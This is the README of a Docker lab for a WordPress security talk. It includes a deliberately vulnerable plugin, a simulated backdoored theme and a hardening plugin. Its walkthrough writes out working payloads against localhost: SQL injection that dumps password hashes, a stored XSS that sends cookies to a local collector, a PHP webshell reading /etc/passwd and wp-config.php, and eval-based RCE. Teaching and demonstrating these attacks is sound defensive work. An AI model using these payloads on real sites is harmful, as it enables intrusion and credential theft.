# Actually Secure Your WordPress (or Keep Yourself Positive)

> DEV.BG Cyber Security User Group — 20.04.2026  
> Speaker: Nedko Hristov, Senior DevOps Engineer @ Nemetschek Bulgaria

## Quick Start

```bash
# 1. Start the stack
docker compose up -d --build

# 2. Wait ~30 seconds for WordPress to initialize, then run setup
docker compose exec wordpress wp-setup.sh

# 3. Open WordPress
open http://localhost:8080          # Frontend
open http://localhost:8080/wp-admin # Admin (admin / admin123)

# 4. Start the attacker tools (WPScan + C2 server)
docker compose --profile tools up -d

# 5. Check attacker C2 dashboard
open http://localhost:9090
```

## Architecture

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Browser    │────▶│  WordPress   │────▶│    MySQL     │
│              │     │  (Apache)    │     │    8.0       │
│              │     │  :8080       │     │              │
└──────────────┘     └──────┬───────┘     └──────────────┘
                            │
                     ┌──────▼───────┐
                     │    Redis     │
                     │ (obj cache)  │
                     └──────────────┘

┌──────────────┐     ┌──────────────┐
│   WPScan     │     │  Attacker    │
│  (scanner)   │     │  C2 Server   │
│              │     │  :9090       │
└──────────────┘     └──────────────┘
```

## What's Included

### Vulnerable Demo Plugin (`wp-vuln-demo`)

| Vulnerability | OWASP | Endpoint | Fix Endpoint |
|---|---|---|---|
| SQL Injection | A03:2021 | `?action=vuln_search&q=` | `?action=vuln_search_fixed&q=` |
| Stored XSS | A03:2021 | `?action=vuln_guestbook_submit` | — |
| Reflected XSS | A03:2021 | `/?vuln_search_page=1&q=` | — |
| CSRF | A01:2021 | `?action=vuln_change_email` | `?action=vuln_change_email_fixed` |
| IDOR | A01:2021 | `?action=vuln_get_user&id=` | `?action=vuln_get_user_fixed` |
| File Upload | A04:2021 | `?action=vuln_upload` | `?action=vuln_upload_fixed` |
| RCE (eval) | A03:2021 | `?action=vuln_calculator` | `?action=vuln_calculator_fixed` |
| Enumeration | A07:2021 | `?action=vuln_debug_info` | — |

### Nulled Theme Demo (`nulled-theme-demo`)

Demonstrates 4 types of backdoors found in pirated themes:
1. Obfuscated eval() via "license check" parameter
2. Hidden admin user auto-creation
3. Phone-home / data exfiltration to attacker C2
4. Webshell hidden in `social-icons.php`

### Security Hardened Plugin (`wp-security-hardened`)

Activate this plugin to demonstrate the "after" state:
- Disables REST API user enumeration
- Removes version info from HTML
- Adds security headers (CSP, X-Frame-Options, etc.)
- Generic login error messages
- Disables XML-RPC
- Blocks PHP execution in uploads

## Demo Walkthrough

### Demo 1: Enumeration (5 min)

```bash
# Username via REST API
curl -s http://localhost:8080/wp-json/wp/v2/users | python3 -m json.tool

# Username via author param
curl -sI 'http://localhost:8080/?author=1' | grep -i location

# WordPress version
curl -s http://localhost:8080 | grep generator

# Server info leak
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_debug_info' | python3 -m json.tool
```

### Demo 2: SQL Injection (5 min)

```bash
# Normal search
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=Welcome' | python3 -m json.tool

# Extract all usernames + password hashes
curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=1'+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-" | python3 -m json.tool

# Show the fixed version is safe
curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search_fixed&q=1'+UNION+SELECT+1,2,3--" | python3 -m json.tool
```

### Demo 3: XSS + Cookie Theft (5 min)

```bash
# Start the attacker C2 server (if not already running)
docker compose --profile tools up -d attacker

# Inject stored XSS into guestbook
curl -d 'action=vuln_guestbook_submit&name=Visitor&message=<script>fetch("http://localhost:9090/steal?c="%2Bdocument.cookie)</script>' \
  http://localhost:8080/wp-admin/admin-ajax.php

# Now visit the vuln-demo admin page as admin → cookie gets stolen
# Check the loot:
curl -s http://localhost:9090/loot | python3 -m json.tool
```

### Demo 4: File Upload → Webshell (5 min)

```bash
# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Upload it
curl -F 'file=@/tmp/shell.php' 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_upload'

# Execute commands
curl http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=id
curl http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/etc/passwd
curl 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/var/www/html/wp-config.php'
```

### Demo 5: RCE via Calculator (3 min)

```bash
# Normal use
curl -d 'action=vuln_calculator&expression=2%2B2' http://localhost:8080/wp-admin/admin-ajax.php

# RCE!
curl -d 'action=vuln_calculator&expression=system(%27id%27)' http://localhost:8080/wp-admin/admin-ajax.php
curl -d 'action=vuln_calculator&expression=system(%27cat+/etc/passwd%27)' http://localhost:8080/wp-admin/admin-ajax.php

# Fixed version blocks it
curl -d 'action=vuln_calculator_fixed&expression=system(%27id%27)' http://localhost:8080/wp-admin/admin-ajax.php
```

### Demo 6: WPScan (3 min)

```bash
docker compose --profile tools run --rm wpscan \
  --url http://wordpress \
  --enumerate u,vp,vt \
  --no-banner
```

### Demo 7: Integrity Check (2 min)

```bash
# Modify a core file
docker compose exec wordpress bash -c "echo '<!-- hacked -->' >> /var/www/html/wp-includes/version.php"

# Detect the change
docker compose exec wordpress wp core verify-checksums --allow-root

# Fix it
docker compose exec wordpress wp core download --force --allow-root
```

### Demo 8: DB Hygiene (3 min)

```bash
# Run hygiene queries
docker compose exec db mysql -u wpuser -pwppassword wordpress < demos/db-hygiene-queries.sql

# Or via wp-cli
docker compose exec wordpress wp db query \
  "SELECT option_name, LENGTH(option_value) as size FROM wp_options WHERE autoload='yes' ORDER BY size DESC LIMIT 10;" \
  --allow-root
```

## Cleanup

```bash
# Stop everything
docker compose --profile tools down

# Remove all data (volumes)
docker compose --profile tools down -v
```

## File Structure

```
.
├── docker-compose.yml          # Main stack
├── Dockerfile.wordpress        # WP image with WP-CLI + Redis
├── Dockerfile.attacker         # Python Flask C2 server
├── PRESENTATION_OUTLINE.md     # Full talk outline & brainstorming
├── README.md                   # This file
├── config/
│   ├── php-demo.ini            # Insecure PHP config (default)
│   ├── php-hardened.ini        # Hardened PHP config (swap to demo)
│   └── nginx-hardened.conf     # Hardened Nginx config example
├── plugins/
│   ├── wp-vuln-demo/           # Intentionally vulnerable plugin
│   │   ├── wp-vuln-demo.php
│   │   └── includes/
│   │       ├── class-sqli-demo.php
│   │       ├── class-xss-demo.php
│   │       ├── class-csrf-demo.php
│   │       ├── class-idor-demo.php
│   │       ├── class-file-upload-demo.php
│   │       ├── class-rce-demo.php
│   │       └── class-enumeration-demo.php
│   └── wp-security-hardened/   # Hardening plugin (the "fix")
│       └── wp-security-hardened.php
├── themes/
│   └── nulled-theme-demo/      # Simulated nulled theme with backdoors
│       ├── functions.php
│       ├── style.css
│       ├── index.php
│       └── social-icons.php    # Hidden webshell demo
├── demos/
│   ├── attack-playbook.sh      # Step-by-step attack commands
│   ├── csrf-attack.html        # CSRF attack page
│   ├── passwords.txt           # Password list for brute force demo
│   └── db-hygiene-queries.sql  # Database optimization queries
└── scripts/
    ├── wp-setup.sh             # WordPress initial setup
    └── attacker_server.py      # Cookie stealing C2 server
```

## Disclaimer

**This project is for EDUCATIONAL PURPOSES ONLY.** All vulnerabilities are intentional and designed for controlled demonstration in an isolated Docker environment. Never deploy this on a public network or production server.

## License

MIT — Use freely for educational purposes.
